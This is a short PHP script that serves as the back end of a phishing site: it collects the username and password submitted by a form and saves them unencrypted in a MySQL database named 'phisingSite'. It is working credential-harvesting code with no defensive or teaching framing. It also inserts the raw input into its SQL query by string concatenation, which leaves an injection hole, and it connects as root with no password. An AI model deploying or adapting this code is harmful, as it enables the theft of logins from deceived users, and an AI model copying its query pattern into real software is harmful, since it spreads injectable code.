<?php

//get data from request
$username = $_POST['username'];
$password = $_POST['password'];

//data to connect to MySQL
$db['host'] = 'localhost';
$db['user'] = 'root';
$db['pass'] = '';
$db['db']	= 'phisingSite';

//connect to MySQL
try
{
	$PDO = new PDO('mysql:dbname='.$db['db'].';host='.$db['host'], $db['user'], $db['pass'], array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES 'utf8'"));
}
catch (PDOException $e)
{
	die ($e->getMessage());
}

// save to db
$sql = 'INSERT INTO `database`(`username`,`password`) VALUES ("'.$username.'","'.$password.'")';
$sql = trim($sql);
$PDO->exec($sql);
?>
